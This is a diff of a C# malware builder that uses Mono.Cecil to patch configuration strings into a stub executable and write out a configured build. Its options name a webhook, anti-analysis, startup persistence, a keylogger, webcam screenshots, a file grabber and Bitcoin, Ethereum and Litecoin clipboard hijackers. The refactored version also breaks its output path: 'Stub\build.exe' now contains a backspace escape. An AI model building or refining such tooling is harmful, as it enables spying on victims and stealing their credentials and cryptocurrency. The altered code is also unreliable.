@@ -1,95 +1,94 @@
 ﻿using Mono.Cecil;
 using Mono.Cecil.Cil;
 
-namespace Builder.Modules.build;
-
-internal sealed class Build
+namespace Builder.Modules.Build
 {
-    private static readonly Random Random = new();
-
-    public static Dictionary<string, string> ConfigValues = new()
+    internal sealed class Build
     {
-        {"Webhook", ""},
-        {"Debug", ""},
+        private static readonly Random random = new();
 
-        {"AntiAnalysis", ""},
-        {"Startup", ""},
-        {"StartDelay", ""},
+        public static readonly Dictionary<string, string> ConfigValues = new()
+        {
+            {"Webhook", ""},
+            {"Debug", ""},
+            {"AntiAnalysis", ""},
+            {"Startup", ""},
+            {"StartDelay", ""},
+            {"ClipperBTC", ""},
+            {"ClipperETH", ""},
+            {"ClipperLTC", ""},
+            {"WebcamScreenshot", ""},
+            {"Keylogger", ""},
+            {"Clipper", ""},
+            {"Grabber", ""},
+            {"Mutex", RandomString(20)}
+        };
 
-        {"ClipperBTC", ""},
-        {"ClipperETH", ""},
-        {"ClipperLTC", ""},
+        private static string RandomString(int length)
+        {
+            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            return new string(Enumerable.Repeat(chars, length)
+                .Select(s => s[random.Next(s.Length)]).ToArray());
+        }
 
-        {"WebcamScreenshot", ""},
-        {"Keylogger", ""},
-        {"Clipper", ""},
+        private static AssemblyDefinition ReadStub()
+        {
+            return AssemblyDefinition.ReadAssembly("Stub\\stub.exe");
+        }
 
-        {"Grabber", ""},
+        private static void WriteStub(AssemblyDefinition definition, string filename)
+        {
+            definition.Write(filename);
+        }
 
-        {"Mutex", RandomString(20)}
-    };
+        private static string ReplaceConfigParams(string value)
+        {
+            foreach (KeyValuePair<string, string> config in ConfigValues)
+            {
+                if (value.Equals($"--- {config.Key} ---"))
+                {
+                    return config.Value;
+                }
+            }
 
-    private static string RandomString(int length)
-    {
-        const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-        return new string(Enumerable.Repeat(chars, length)
-            .Select(s => s[Random.Next(s.Length)]).ToArray());
-    }
+            return value;
+        }
 
-
-    // Read stub
-    private static AssemblyDefinition ReadStub()
-    {
-      return AssemblyDefinition.ReadAssembly("Stub\\stub.exe");
-    }
-
-    // Write stub
-    private static void WriteStub(AssemblyDefinition definition, string filename)
-    {
-        definition.Write(filename);
-    }
-
-    // Replace values in config
-    private static string ReplaceConfigParams(string value)
-    {
-        foreach (var config in ConfigValues)
-            if (value.Equals($"--- {config.Key} ---"))
-                return config.Value;
-
-        return value;
-    }
-
-    // Iterate through all classes, rows and replace values.
-    public static AssemblyDefinition IterValues(AssemblyDefinition definition)
-    {
-        foreach (var definition2 in definition.Modules)
-        foreach (var definition3 in definition2.Types)
-            if (definition3.Name.Equals("Config"))
-                foreach (var definition4 in definition3.Methods)
-                    if (definition4.IsConstructor && definition4.HasBody)
+        public static AssemblyDefinition IterValues(AssemblyDefinition definition)
+        {
+            foreach (ModuleDefinition module in definition.Modules)
+            {
+                foreach (TypeDefinition type in module.Types)
+                {
+                    if (type.Name.Equals("Config"))
                     {
-                        IEnumerator<Instruction> enumerator = definition4.Body.Instructions.GetEnumerator();
-                        while (enumerator.MoveNext())
+                        foreach (MethodDefinition method in type.Methods)
                         {
-                            var current = enumerator.Current;
-                            if (current != null && (current.OpCode.Code == Code.Ldstr) & current.Operand is object)
+                            if (method.IsConstructor && method.HasBody)
                             {
-                                var str = current.Operand.ToString();
-                                if (str.StartsWith("---") && str.EndsWith("---"))
-                                    current.Operand = ReplaceConfigParams(str);
+                                foreach (Instruction instruction in method.Body.Instructions)
+                                {
+                                    if (instruction.OpCode.Code == Code.Ldstr &&
+                                        instruction.Operand is string operand &&
+                                        operand.StartsWith("---") && operand.EndsWith("---"))
+                                    {
+                                        instruction.Operand = ReplaceConfigParams(operand);
+                                    }
+                                }
                             }
                         }
                     }
+                }
+            }
+            return definition;
+        }
 
-        return definition;
-    }
-
-    // Read stub && compile
-    public static string BuildStub()
-    {
-        var definition = ReadStub();
-        definition = IterValues(definition);
-        WriteStub(definition, "Stub\\build.exe");
-        return "Stub\\build.exe";
+        public static string BuildStub()
+        {
+            AssemblyDefinition definition = ReadStub();
+            definition = IterValues(definition);
+            WriteStub(definition, "Stub\build.exe");
+            return "Stub\build.exe";
+        }
     }
 }
